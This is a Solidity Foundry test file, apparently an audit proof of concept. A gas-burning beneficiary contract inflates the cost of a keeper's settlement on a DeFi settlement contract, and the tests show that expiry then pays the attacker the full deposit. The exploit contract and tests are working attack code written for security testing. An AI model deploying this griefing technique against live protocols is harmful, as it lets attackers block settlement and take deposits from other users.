// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Currency} from "v4-core/types/Currency.sol";
import {console2} from "forge-std/console2.sol";
import {TouchstoneFixture} from "ts/test/utils/TouchstoneFixture.sol";
import {Record} from "ts/src/types/Record.sol";
import {Payout} from "ts/src/types/Payout.sol";
import {PoolState} from "ts/src/types/PoolState.sol";

/// Beneficiary that burns every unit of forwarded gas unless it is paid the full deposit.
contract GasBurner {
    uint256 public full;
    function setFull(uint256 f) external { full = f; }
    receive() external payable {
        if (msg.value < full) {
            assembly { invalid() }
        }
    }
}

contract RefundGasGriefTest is TouchstoneFixture {
    function setUp() public { _setUp(0, 6); }

    function _flagTo(address ben) internal returns (Record memory r) {
        vm.roll(block.number + 1);
        vm.recordLogs();
        _swap(trader, true, true, 500_000 * 10 ** decQuote, abi.encode(ben));
        bool found;
        (r, found) = _lastRecord();
        require(found, "not flagged");
        require(r.depositIn0, "deposit not ETH");
    }

    function _tryAt(Record memory r, bytes[] memory u, uint256 g) internal returns (bool ok) {
        vm.prank(keeper, keeper);
        try settler.settle{gas: g}(r, u) { ok = true; } catch { ok = false; }
    }

    function _minGas(Record memory r, bytes[] memory u) internal returns (uint256) {
        uint256 lo = 50_000; uint256 hi = 30_000_000;
        uint256 snap = vm.snapshotState();
        require(_tryAt(r, u, hi), "fails even at 30M");
        vm.revertToState(snap);
        while (hi - lo > 1_000) {
            uint256 mid = (lo + hi) / 2;
            snap = vm.snapshotState();
            bool ok = _tryAt(r, u, mid);
            vm.revertToState(snap);
            if (ok) hi = mid; else lo = mid;
        }
        return hi;
    }

    function _run(address ben) internal returns (Record memory r, bytes[] memory u, uint256 g) {
        r = _flagTo(ben);
        uint64 t0 = uint64(r.timestamp) + 3;
        vm.warp(t0);
        u = _updateRaw(3_300e8, t0, t0 - 1, 0);
        g = _minGas(r, u);
    }

    function test_Baseline_HonestBeneficiary() public {
        (Record memory r, bytes[] memory u, uint256 g) = _run(makeAddr("honest"));
        vm.prank(keeper, keeper);
        Payout memory p = settler.settle(r, u);
        console2.log("deposit", r.deposit);
        console2.log("refund ", p.refund);
        console2.log("min gas, honest beneficiary", g);
    }

    function test_PoC_GasBurningBeneficiaryInflatesSettleCost() public {
        GasBurner b = new GasBurner();
        // The attacker knows the deposit its own swap will post; set it before the record exists.
        b.setFull(type(uint256).max);
        Record memory r0 = _flagTo(address(b));
        b.setFull(r0.deposit);
        uint64 t0 = uint64(r0.timestamp) + 3;
        vm.warp(t0);
        bytes[] memory u = _updateRaw(3_300e8, t0, t0 - 1, 0);
        uint256 g = _minGas(r0, u);
        console2.log("min gas, gas-burning beneficiary", g);

        // A keeper budgeting 1,000,000 gas (about 4x the honest cost) cannot settle.
        assertFalse(_tryAt(r0, u, 1_000_000), "settle should revert at 1M gas");

        vm.prank(keeper, keeper);
        Payout memory p = settler.settle{gas: g}(r0, u);
        console2.log("refund deferred to ledger:", p.refund);

        // If nobody pays that, expiry hands the attacker the whole deposit.
    }

    function test_PoC_ExpiryPaysAttackerInFull() public {
        GasBurner b = new GasBurner();
        b.setFull(type(uint256).max);
        Record memory r = _flagTo(address(b));
        b.setFull(r.deposit);
        vm.warp(uint256(r.timestamp) + 3 + 1 days);
        uint256 before = address(b).balance;
        settler.expire(r);
        assertEq(address(b).balance - before, r.deposit, "full refund on expiry");
        console2.log("expire gas-light, attacker refunded", r.deposit);
    }
}
